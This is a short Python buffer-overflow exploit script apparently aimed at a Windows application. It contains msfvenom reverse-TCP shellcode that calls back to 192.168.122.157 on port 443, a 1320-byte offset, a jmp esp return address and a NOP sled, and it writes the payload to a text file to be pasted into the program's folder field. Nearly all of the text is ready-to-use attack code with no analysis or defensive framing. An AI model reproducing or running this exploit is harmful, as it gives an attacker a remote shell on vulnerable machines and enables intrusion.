# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.157 LPORT=443 -a x86 --platform windows -b '\x00\x0a\x0d' -f c
# 351 bytes
shellcode = ("\xba\xb5\xa5\x07\xf7\xdb\xd8\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x83\xc5\x04\x31\x55\x0e\x03\xe0\xab\xe5\x02\xf6\x5c\x6b"
"\xec\x06\x9d\x0c\x64\xe3\xac\x0c\x12\x60\x9e\xbc\x50\x24\x13"
"\x36\x34\xdc\xa0\x3a\x91\xd3\x01\xf0\xc7\xda\x92\xa9\x34\x7d"
"\x11\xb0\x68\x5d\x28\x7b\x7d\x9c\x6d\x66\x8c\xcc\x26\xec\x23"
"\xe0\x43\xb8\xff\x8b\x18\x2c\x78\x68\xe8\x4f\xa9\x3f\x62\x16"
"\x69\xbe\xa7\x22\x20\xd8\xa4\x0f\xfa\x53\x1e\xfb\xfd\xb5\x6e"
"\x04\x51\xf8\x5e\xf7\xab\x3d\x58\xe8\xd9\x37\x9a\x95\xd9\x8c"
"\xe0\x41\x6f\x16\x42\x01\xd7\xf2\x72\xc6\x8e\x71\x78\xa3\xc5"
"\xdd\x9d\x32\x09\x56\x99\xbf\xac\xb8\x2b\xfb\x8a\x1c\x77\x5f"
"\xb2\x05\xdd\x0e\xcb\x55\xbe\xef\x69\x1e\x53\xfb\x03\x7d\x3c"
"\xc8\x29\x7d\xbc\x46\x39\x0e\x8e\xc9\x91\x98\xa2\x82\x3f\x5f"
"\xc4\xb8\xf8\xcf\x3b\x43\xf9\xc6\xff\x17\xa9\x70\x29\x18\x22"
"\x80\xd6\xcd\xe5\xd0\x78\xbe\x45\x80\x38\x6e\x2e\xca\xb6\x51"
"\x4e\xf5\x1c\xfa\xe5\x0c\xf7\xc5\x52\x74\x9a\xae\xa0\x88\xa5"
"\x95\x2c\x6e\xcf\xf9\x78\x39\x78\x63\x21\xb1\x19\x6c\xff\xbc"
"\x1a\xe6\x0c\x41\xd4\x0f\x78\x51\x81\xff\x37\x0b\x04\xff\xed"
"\x23\xca\x92\x69\xb3\x85\x8e\x25\xe4\xc2\x61\x3c\x60\xff\xd8"
"\x96\x96\x02\xbc\xd1\x12\xd9\x7d\xdf\x9b\xac\x3a\xfb\x8b\x68"
"\xc2\x47\xff\x24\x95\x11\xa9\x82\x4f\xd0\x03\x5d\x23\xba\xc3"
"\x18\x0f\x7d\x95\x24\x5a\x0b\x79\x94\x33\x4a\x86\x19\xd4\x5a"
"\xff\x47\x44\xa4\x2a\xcc\x74\xef\x76\x65\x1d\xb6\xe3\x37\x40"
"\x49\xde\x74\x7d\xca\xea\x04\x7a\xd2\x9f\x01\xc6\x54\x4c\x78"
"\x57\x31\x72\x2f\x58\x10")

buffer = "A"*1320			# offset
buffer += "\xdf\x44\xc6\x4e"		# jmp esp
buffer += "\x90"* (400-16-351) + shellcode

# put file contents into options -> folder field
f = open("vivafranco.txt", "w")
f.write(buffer)
f.close
